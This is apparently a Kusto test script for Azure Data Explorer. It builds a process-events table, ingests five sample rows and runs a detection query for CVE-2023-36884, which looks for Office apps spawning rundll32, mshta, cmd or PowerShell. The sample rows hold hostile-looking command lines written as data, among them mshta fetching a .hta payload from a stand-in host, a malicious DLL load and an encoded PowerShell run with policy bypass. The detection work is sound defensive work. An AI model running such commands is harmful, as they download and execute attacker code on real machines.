// ---------------------------
// ThreatChain â€” ADX Test Script
// Purpose: create table, mapping, ingest sample CSV rows inline, run CVE-2023-36884 detection
// Paste all of this into your ADX Kusto query window and run
// ---------------------------

// 1) Create table (remove/comment if table already exists)
.create table DeviceProcessEvents (
    TimeGenerated: datetime,
    DeviceName: string,
    InitiatingProcessFileName: string,
    FileName: string,
    ProcessCommandLine: string
)

// 2) Create CSV ingestion mapping (used for ingestion without headers)
.create table DeviceProcessEvents ingestion csv mapping 'DeviceProcessEvents_CSV_Mapping' '[ 
  {"column":"TimeGenerated","DataType":"datetime","Properties":{"Ordinal":"0"}}, 
  {"column":"DeviceName","DataType":"string","Properties":{"Ordinal":"1"}}, 
  {"column":"InitiatingProcessFileName","DataType":"string","Properties":{"Ordinal":"2"}}, 
  {"column":"FileName","DataType":"string","Properties":{"Ordinal":"3"}}, 
  {"column":"ProcessCommandLine","DataType":"string","Properties":{"Ordinal":"4"}} 
]'

// 3) Inline ingest sample rows (small dataset for quick testing)
// NOTE: the inline ingestion is convenient for dev testing. For larger tests use blob ingestion.
.ingest inline into table DeviceProcessEvents <|
2025-10-28T12:00:00Z,HOST-TEST-01,WINWORD.EXE,rundll32.exe,"rundll32.exe \"%USERPROFILE%\\malicious.dll\",EntryPoint"
2025-10-28T12:05:00Z,HOST-TEST-01,WINWORD.EXE,mshta.exe,"mshta.exe http://malicious.example/payload.hta"
2025-10-28T12:10:00Z,HOST-TEST-02,OUTLOOK.EXE,powershell.exe,"powershell.exe -NoProfile -ExecutionPolicy Bypass -EncodedCommand ... "
2025-10-28T12:15:00Z,HOST-TEST-03,EXCEL.EXE,cmd.exe,"cmd.exe /c cscript //B legitimate.vbs"
2025-10-28T12:20:00Z,HOST-TEST-04,WINWORD.EXE,notepad.exe,"notepad.exe C:\\temp\\readme.txt"

// 4) Wait a few seconds for ingestion to complete, then run the detection query
// CVE-2023-36884 detection: Office spawning high-risk children
DeviceProcessEvents
| where TimeGenerated >= ago(7d)
| where InitiatingProcessFileName in~ ("WINWORD.EXE", "EXCEL.EXE", "OUTLOOK.EXE")
| where FileName in~ ("rundll32.exe", "mshta.exe", "cmd.exe", "powershell.exe")
| extend CommandLineLower = tolower(ProcessCommandLine)
| where CommandLineLower !contains "office"
| project TimeGenerated, DeviceName, InitiatingProcessFileName, FileName, ProcessCommandLine
| order by TimeGenerated desc
